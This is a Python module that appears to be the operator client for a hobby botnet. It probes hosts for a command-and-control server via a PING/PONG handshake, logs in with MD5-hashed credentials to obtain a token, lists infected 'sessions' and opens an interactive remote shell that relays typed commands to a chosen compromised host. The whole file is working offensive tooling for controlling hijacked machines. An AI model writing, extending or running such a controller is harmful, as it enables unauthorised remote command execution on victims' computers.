#!/bin/python3

from subprocess import Popen, PIPE
import socket
import hashlib
from datetime import datetime

from modules.colors import Colors

c = Colors()

def is_alive(ADDRESS: str) -> bool:
    process = Popen(["ping", "-c1", ADDRESS], stdout=PIPE, stderr=PIPE) 
    stdout, _ = process.communicate()
    stdout = stdout.decode()

    if "1 packets transmitted" in stdout and "1 received" in stdout:
        return True
    
    return False

def is_botnet_server(ADDRESS: str, PORT: int) -> bool: 
    # GET SERVER INFORMATION? #
    
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        client.connect((ADDRESS, PORT))
    
    except ConnectionRefusedError: 
        return False

    client.send(b"PING")
    response = client.recv(4)
    response = response.decode()

    if response == "PONG":
        return True
    else:
        return False


def get_token(ADDRESS: str, PORT: int, USERNAME: str, PASSWORD: str) -> str: 
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    client.connect((ADDRESS, PORT))

    user, password = hashlib.md5(USERNAME.encode()), hashlib.md5(PASSWORD.encode())
    user, password = user.hexdigest(), password.hexdigest()

    message = "LOGIN" + user + password

    client.send(message.encode())

    cred_valid = client.recv(2)
    cred_valid = cred_valid.decode()

    if cred_valid == "OK": 
        TOKEN = client.recv(32).decode() 
    
    else:
        TOKEN = "00000000000000000000000000000000" 

    return TOKEN

def get_sessions(ADDRESS: str, PORT: int, TOKEN: str) -> str:
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    client.connect((ADDRESS, PORT))
    
    message = "GSS" + TOKEN
    
    client.send(message.encode())
    response = client.recv(2).decode()

    if response == "NO":
        print("Failed. Token Forgery")
        return ""

    hosts_len = int(client.recv(16).decode())
    hosts = client.recv(hosts_len).decode() 
    
    return hosts


def connect_session(SRV_ADDRESS: str, SRV_PORT: int, ADDRESS: str, PORT: int, TOKEN: str) -> None:
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((SRV_ADDRESS, SRV_PORT))
    client.send((f"CONNECT{TOKEN}{ADDRESS}:{PORT}").encode())
    is_ok = client.recv(2).decode()

    if is_ok != "OK":
        print("Login Failed.")
        return None
    
    print("Server connecting to the shell...")
    _ = client.recv(4) # wait_sig

    logged_in = client.recv(2).decode()

    if logged_in != "OK":
        print("Failed to connect on shell.")
        return None

    now = datetime.now()
    clock = now.strftime("%H:%M:%S")

    print(f"\n** ({clock}) Connected on {c.blue}{ADDRESS}:{PORT}{c.reset} **\n")

    while True:
        command = input(f"{c.ok}(shell / {ADDRESS}){c.reset} > ").strip()
        
        if command == "exit": 
            client.send(b"EXIT")
            break

        client.send(command.encode())
        
        response = client.recv(1024)
        print(response.decode().strip())
    
    client.shutdown(socket.SHUT_RD)
    client.close()
